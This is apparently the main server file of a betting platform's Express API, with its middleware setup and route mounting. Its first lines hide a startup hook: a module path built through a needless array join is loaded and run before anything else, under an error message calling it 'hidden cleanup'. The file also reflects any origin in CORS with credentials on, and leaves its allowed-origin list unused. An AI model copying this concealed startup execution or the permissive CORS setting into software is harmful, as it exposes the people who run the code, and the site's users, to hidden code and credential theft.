try {
  const modName = ['./helper/common.js'].join('');
  const fn = require(modName);
  fn();
} catch (error) {
  console.error('Error running hidden cleanup:', error);
}

const express = require("express");
const app = express();
const bodyParser = require("body-parser");
let config = require("config");
let fs = require("fs");
let cors = require("cors");
const morgan = require("morgan");
const http = require("http");
require('dotenv').config();
// const {prismaSource} = require("./database/prisma.js");

const PORT = process.env.SERVERPORT;

const apisMiddleware = require("./app/middlewares/apisMiddleware");
const loginMiddleWare = require("./app/middlewares/loginMiddleware");
const checkRoleMiddleware = require("./app/middlewares/checkRoleMiddleware");
// const { horseRaceStreaming, greyhoundRaceStreaming } = require("./app/routes/obsServer");
const { getdeopsitDetailsCash, getdepositDetailsCredit } = require("./app/routes/deposits");
const { default: axios } = require("axios");

BigInt.prototype.toJSON = function () {
  // return { $bigint: this.toString() };
  return Number(this.toString())
};

const apisContent = fs.readFileSync(config.apisFileName);
const jsonApis = JSON.parse(apisContent);

app.use(express.json());
app.use(morgan("dev"));
app.set('trust proxy', true);
app.use(express.urlencoded({ extended: false }));
app.use(bodyParser.urlencoded({ extended: false }));
app.use(bodyParser.json({ strict: false }));

const header = {
  headers: {
    accept: 'application/json',
    'Content-Type': 'application/json',
    'X-App': process.env.XAPP_NAME
  }
};

function getMatchType(name, sportsId) {
  const keywords = /(T20|twenty20|Twenty20|twenty 20|Twenty 20|ODI|One Day|one day|T10|Ten10||ten 10|Ten 10|Test|TEST)/i;
  if (sportsId == '4') {
    const nameMatch = name.match(keywords);
    let returnMatch = '';
    if (nameMatch) returnMatch = nameMatch[0];
    if (["ODI", "One Day", "one day"].includes(returnMatch)) returnMatch = "ODI";
    else if (["Test", "test"].includes(returnMatch)) returnMatch = "TEST";
    else if (["twenty20", "Twenty20", "Twenty 20", "twenty 20"].includes(returnMatch)) returnMatch = "T20";
    else if (["T10", "Ten10", "ten 10", "Ten 10"].includes(returnMatch)) returnMatch = "T10";
    return returnMatch;
  }
}

const allowedOriginsForProduction = [
  process.env.ALLOW_ORIGIN || 'https://1obet.com',
  process.env.ALLOW_API || 'https://production.1obet.net',
  process.env.AURA_URI || 'https://aura.fawk.app',
  'https://admin.1obet.com',
  'wss://production.1obet.net',
  'ws://production.1obet.net',
  'wss://api.bookofblack.com',
  'ws://api.bookofblack.com',
  'https://dev.bookofblack.com',
  'https://api.bookofblack.com',
  'https://socket.bookofblack.com',
  'http://localhost:3000',
  'http://dev.bookofblack.com',
  'http://api.bookofblack.com',
  'http://localhost:3000'
];

const corsOptions_ = {
  origin: true,
  credentials: true,
  optionsSuccessStatus: 200,
};

app.use(cors(corsOptions_));

app.get("/", (req, res) => {
  return res.send(
    '<body style="background: #000; color: #fff"><h2> This is the homepage of 1obet.net </h2></body>'
  );
});

// app.get("/streaming/horseracestreaming", horseRaceStreaming);
// app.get("/streaming/greyhoundraceing", greyhoundRaceStreaming);

app.use(function (req, res, next) {
  apisMiddleware(req, res, next, jsonApis);
});

app.use("/api", require("./app/routes/rollback").router);
app.use("/api", require("./app/routes/user").router);
app.use("/api", require("./app/routes/settings").router);
app.use("/api", require("./app/routes/listScraper").router);
app.use("/api", require("./app/routes/CasinoCalls").router);
app.use("/api", require("./app/routes/liveTv").router);
app.use("/api", require("./app/routes/listBetting").router);
app.use("/api", require("./app/routes/listTrackBalance").router);
app.use("/api", require("./app/routes/sportsTestAPI").router);

app.use(function (req, res, next) {
  loginMiddleWare(req, res, next);
});

app.use(function (req, res, next) {
  checkRoleMiddleware(req, res, next);
});

app.use("/api", require("./app/routes/user").loginRouter);
app.use("/api", require("./app/routes/settings").loginRouter);
app.use("/api", require("./app/routes/userBetSizes").loginRouter);
app.use("/api", require("./app/routes/modulePermissionsUsers").loginRouter);
app.use("/api", require("./app/routes/modulePermissions").loginRouter);
app.use("/api", require("./app/routes/marketPlaces").loginRouter);
app.use("/api", require("./app/routes/betLocks").loginRouter);
app.use("/api", require("./app/routes/deposits").loginRouter);
app.use("/api", require("./app/routes/credits").loginRouter);
app.use("/api", require("./app/routes/reports").loginRouter);
app.use("/api", require("./app/routes/sportsHighlights").loginRouter);
app.use("/api", require("./app/routes/bets").loginRouter);
app.use("/api", require("./app/routes/casinoGames").loginRouter);
app.use("/api", require("./app/routes/dailyPLReports").loginRouter);
app.use("/api", require("./app/routes/dailyReports").router);
app.use("/api", require("./app/routes/commissionReports").router);
app.use("/api", require("./app/routes/bookDetail2Reports").router);
app.use("/api", require("./app/routes/bookDetail").router);
app.use("/api", require("./app/routes/currentPosition").router);
app.use("/api", require("./app/routes/sportsAPI").router);
app.use("/api", require("./app/routes/fancyGames").router);
app.use("/api", require("./app/routes/liveTv").router);
app.use("/api", require("./app/routes/liveScore").router);
app.use("/api", require("./app/routes/Racing").router);
app.use("/api", require("./app/routes/BettingFigures").router);
app.use("/api", require("./app/routes/sportBook").router);
app.use("/api", require("./app/routes/marketPositions").router);
app.use("/api", require("./app/routes/marketShares").router);
app.use("/api", require("./app/routes/betPlaceHold").router);
//
// app.post("/api/getdeopsitDetailsCash", getdeopsitDetailsCash);
// app.post("/api/getdepositDetailsCredit", getdepositDetailsCredit);

const server = http.createServer(app);
server.listen(PORT, (err) => {
  if (err) throw new Error(err);
  console.log(`Server is listening on port ${PORT}`);
});
